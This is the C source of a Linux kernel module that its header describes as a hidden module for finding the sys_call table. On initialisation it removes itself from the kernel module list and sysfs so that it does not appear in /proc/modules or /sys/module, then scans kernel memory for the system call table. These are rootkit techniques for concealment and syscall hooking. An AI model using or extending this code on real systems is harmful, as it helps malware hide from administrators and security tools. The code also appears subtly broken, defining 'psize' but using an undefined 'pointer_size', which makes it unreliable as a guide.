#include <linux/module.h> // included for all kernel modules
#include <linux/kernel.h> // included for KERN_INFO
#include <linux/init.h> // included for __init and __exit macros
 
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif
 
 
MODULE_LICENSE("GPL");
MODULE_AUTHOR("sotek <sotek72@gmail.com>");
MODULE_DESCRIPTION("A hidden module to find the sys_call table.");
 
psize *sys_call_table;
 
pointer_size **find(void)
{
    pointer_size **sctable;
    pointer_size i = START_CHECK;
    while (i < END_CHECK) {
        sctable = (pointer_size **) i;
        if (sctable[__NR_close] == (pointer_size *) sys_close) {
            return &sctable[0];
        }
        i += sizeof(void *);
    }
    return NULL;
}
 
static int __init hidden_init(void)
{
    /* Hide the module from proc/modules, Sys/modules tracking */
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    
    /* Find the sys_call_table address in kernel memory */
    if ((sys_call_table = (pointer_size *) find())) {
        printk("sys_call_table found at %p\n", sys_call_table);
    } else {
        printk("sys_call_table not found, exiting\n");
    }
    return 0; // Non-zero return means that the module couldn't be loaded.
}
 
static void __exit hidden_cleanup(void)
{
    printk(KERN_INFO "Cleaning up module.\n");
}
 
module_init(hidden_init);
module_exit(hidden_cleanup);
